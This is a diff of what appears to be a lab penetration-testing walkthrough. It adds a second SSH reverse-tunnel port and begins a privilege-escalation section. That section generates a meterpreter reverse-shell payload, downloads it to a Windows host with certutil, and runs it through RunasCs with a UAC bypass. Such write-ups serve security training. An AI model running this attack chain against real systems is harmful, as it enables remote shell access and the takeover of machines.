@@ -883,10 +883,10 @@ wao@LAB-2:~$ sudo systemctl restart sshd
 
 SSH from Kali to `LAB-2` to create the reverse tunnel:
 - `0.0.0.0:8080:10.10.14.35:80` for payload download
-- `0.0.0.0:4444:10.10.14.35:4444` for reverse shell connection
+- `0.0.0.0:4444:10.10.14.35:4444` and `0.0.0.0:4445:10.10.14.35:4445` for reverse shell connections
 
 ```console
-root@kali:~# proxychains -q ssh -R 0.0.0.0:8080:10.10.14.35:80  -R 0.0.0.0:4444:10.10.14.35:4444 wao@192.168.99.12
+root@kali:~# proxychains -q ssh -R 0.0.0.0:8080:10.10.14.35:80  -R 0.0.0.0:4444:10.10.14.35:4444 -R 0.0.0.0:4445:10.10.14.35:4445 wao@192.168.99.12
 --------------------------[!]WARNING[!]-----------------------------
 |This LAB is created for web app features testing purposes ONLY....|
 |Please DO NOT leave any critical information while this machine is|
@@ -908,9 +908,11 @@ tcp                    LISTEN                   0                        128    
 tcp                    LISTEN                   0                        128                                         127.0.0.53%lo:53                                            0.0.0.0:*
 tcp                    LISTEN                   0                        128                                               0.0.0.0:22                                            0.0.0.0:*
 tcp                    LISTEN                   0                        128                                               0.0.0.0:4444                                          0.0.0.0:*
+tcp                    LISTEN                   0                        128                                               0.0.0.0:4445                                          0.0.0.0:*
 tcp                    LISTEN                   0                        128                                                  [::]:8080                                             [::]:*
 tcp                    LISTEN                   0                        128                                                  [::]:22                                               [::]:*
 tcp                    LISTEN                   0                        128                                                  [::]:4444                                             [::]:*
+tcp                    LISTEN                   0                        128                                                  [::]:4445                                             [::]:*
 ```
 
 #### 5.3.2. Generate a reverse shell executable that points to `LAB-2`
@@ -966,7 +968,7 @@ Successfully processed 1 files; Failed processing 0 files
 
 ### 5.4. Getting a shell
 
-Start the listener:
+Start a listener:
 
 ```console
 root@kali:~# rlwrap nc -nlvp 4444
@@ -1091,3 +1093,93 @@ type C:\Users\Martin.T\Desktop\user.txt
 
 ## 6. Privilege escalation
 
+Stage meterpreter listener
+
+```console
+root@kali:~# msfconsole
+Metasploit tip: The use command supports fuzzy searching to try and
+select the intended module, e.g. use kerberos/get_ticket or use
+kerberos forge silver ticket
+⋮
+                      Metasploit
+
+       =[ metasploit v6.4.38-dev                          ]
++ -- --=[ 2466 exploits - 1273 auxiliary - 393 post       ]
++ -- --=[ 1475 payloads - 49 encoders - 13 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+PAYLOAD => windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 0.0.0.0
+LHOST => 0.0.0.0
+msf6 exploit(multi/handler) > set LPORT 4445
+LPORT => 4445
+msf6 exploit(multi/handler) > options
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     0.0.0.0          yes       The listen address (an interface may be specified)
+   LPORT     4445             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/handler) > exploit -j
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 0.0.0.0:4445
+```
+
+Create meterpreter payload:
+
+```console
+root@kali:~# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.99.12 LPORT=4445 -f exe -o /var/www/html/reverse4445.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7168 bytes
+Saved as: /var/www/html/reverse4445.exe
+```
+
+Prepare RunasCs in Kali:
+
+```sh
+VERSION=$(curl -sI https://github.com/antonioCoco/RunasCs/releases/latest | grep location: | cut -d / -f 8 | tr -d '\r' | tr -d 'v')
+curl -sLO https://github.com/antonioCoco/RunasCs/releases/download/v$VERSION/RunasCs.zip
+unzip RunasCs.zip
+mv RunasCs.exe /var/www/html
+```
+
+Try to RunasCs with `wao`:
+
+``` cmd
+C:\Windows\system32>cd C:\temp
+cd C:\temp
+
+C:\temp>certutil.exe -urlcache -f -split http://192.168.99.12:8080/reverse4445.exe
+certutil.exe -urlcache -f -split http://192.168.99.12:8080/reverse4445.exe
+****  Online  ****
+  0000  ...
+  1c00
+CertUtil: -URLCache command completed successfully.
+
+C:\temp>.\RunasCs.exe --bypass-uac reverse4445
+.\RunasCs.exe --bypass-uac -r 192.168.99.12:4445 .\reverse4445.exe
+```
